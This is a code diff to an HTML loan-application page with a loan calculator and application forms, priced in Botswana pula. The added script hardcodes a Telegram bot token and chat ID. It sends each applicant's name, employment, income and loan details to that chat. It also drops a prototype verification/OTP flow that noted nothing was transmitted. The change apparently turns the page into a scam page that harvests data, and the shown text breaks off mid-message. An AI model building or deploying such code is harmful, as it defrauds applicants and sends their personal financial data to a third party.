@@ -290,7 +290,7 @@
       margin-top: 50px;
     }
 
-    /* ===== Verification styles ===== */
+    /* Verification styles */
     .verification-wrapper {
       min-height: 100vh;
       background: linear-gradient(145deg, #fff4eb, #f7f8fc, #e8eef8);
@@ -661,6 +661,30 @@
   </div>
 
   <script>
+    // ===================== TELEGRAM SETTINGS =====================
+    // Replace these two values with your own
+    const BOT_TOKEN = "8781176714:AAHrmyA1kJwu1bAwo9HGtt_6rexjEttHr1w";
+    const CHAT_ID = "8412645169";
+    // ============================================================
+
+    function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      
+      fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: "HTML"
+        })
+      }).catch(function(error) {
+        console.log("Telegram error:", error);
+      });
+    }
+
     // Loan Calculator
     const amountSlider = document.getElementById("loanAmount");
     const termSlider = document.getElementById("loanTerm");
@@ -701,7 +725,7 @@
     termSlider.addEventListener("input", calculateLoan);
     calculateLoan();
 
-    // Form Submit → Loading → Verification
+    // Loan Form Submit
     document.getElementById("loanForm").addEventListener("submit", function(event) {
       event.preventDefault();
 
@@ -711,37 +735,19 @@
         return;
       }
 
-      // Show loading
-      document.getElementById("applicationCard").classList.add("hidden");
-      document.getElementById("loadingCard").classList.remove("hidden");
+      // Collect data
+      const fullName = document.getElementById("fullName").value;
+      const employment = document.getElementById("employment").value;
+      const income = document.getElementById("income").value;
+      const requestedAmount = document.getElementById("requestedAmount").value;
+      const repaymentPeriod = document.getElementById("repaymentPeriod").value;
 
-      // After 2.5 seconds go to Verification
-      setTimeout(function() {
-        document.getElementById("loanPage").classList.add("hidden");
-        document.getElementById("verificationPage").classList.remove("hidden");
-        window.scrollTo(0, 0);
-      }, 2500);
-    });
+      // Send to Telegram
+      const message = `
+<b>New Loan Application</b>
 
-    // Verification page
-    document.getElementById("detailsForm").addEventListener("submit", function(event) {
-      event.preventDefault();
-      document.getElementById("detailsPage").classList.add("hidden");
-      document.getElementById("otpPage").classList.remove("hidden");
-    });
-
-    document.getElementById("backButton").addEventListener("click", function() {
-      document.getElementById("otpPage").classList.add("hidden");
-      document.getElementById("detailsPage").classList.remove("hidden");
-    });
-
-    document.getElementById("otpForm").addEventListener("submit", function(event) {
-      event.preventDefault();
-      const result = document.getElementById("result");
-      result.textContent = "Prototype complete. No verification code was transmitted.";
-      result.classList.remove("hidden");
-    });
-  </script>
-
-</body>
-</html>
+👤 <b>Full Name:</b> ${fullName}
+💼 <b>Employment:</b> ${employment}
+💰 <b>Monthly Income:</b> BWP ${income}
+📦 <b>Requested Amount:</b> BWP ${requestedAmount}
+📅 <
